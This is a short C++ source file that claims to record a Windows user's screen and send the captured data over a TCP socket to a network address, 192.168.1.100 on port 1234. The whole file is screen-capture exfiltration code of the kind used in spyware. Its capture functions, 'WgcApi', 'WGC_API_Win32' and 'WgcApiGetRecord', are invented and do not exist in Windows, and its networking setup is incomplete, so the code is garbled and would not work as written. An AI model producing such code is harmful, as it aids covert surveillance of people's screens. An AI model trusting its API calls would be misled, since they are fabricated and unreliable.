#include <Windows.h>
#include <Winuser.h>
#include <Wininet.h>
#include <iostream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")

// Function to record screen
void recordScreen() {
    // Create a WGC API handle
    HANDLE hWgc = CreateFileW(L"WgcApi", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    // Initialize the WGC API
    WGC_API_Win32 wgc;
    wgc.lpfn = (WGC_API_CALLBACK*)GetProcAddress(GetModuleHandleA("WGC_API"), "WgcApiCallback");
    wgc.hInstance = GetModuleHandleA(NULL);
    wgc.cbSize = sizeof(WGC_API_Win32);
    wgc.pfnCallback = (WGC_API_CALLBACK*)wgc.lpfn;

    // Start recording
    if (WgcApi(wgc, 0, 0, 0) == 0) {
        // Get recorded data from WGC API
        LPVOID pData = WgcApiGetRecord(wgc, 0, NULL, NULL);
        if (pData != NULL) {
            // Transmit recorded data to network address
            std::string networkAddress = "192.168.1.100";
            std::string recordData = (char*)pData;
            // Use TCP protocol to transmit data
            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            sockaddr_in serverSock;
            serverSock.sin_family = AF_INET;
            serverSock.sin_port = htons(1234);
            inet_pton(AF_INET, networkAddress.c_str(), &serverSock.sin_addr);
            connect(sock, (sockaddr*)&serverSock, sizeof(serverSock));
            send(sock, recordData.c_str(), recordData.size(), 0);
            closesocket(sock);
            // Release WGC API resources
            WgcApiFreeRecord(wgc, pData);
            WgcApiUninit(wgc);
        } else {
            std::cerr << "Error: Unable to get recorded data from WGC API." << std::endl;
        }
    } else {
        std::cerr << "Error: Unable to start recording with WGC API." << std::endl;
    }

    // Close WGC API handle
    CloseHandle(hWgc);
}

int main() {
    // Call recordScreen function
    recordScreen();

    return 0;
}
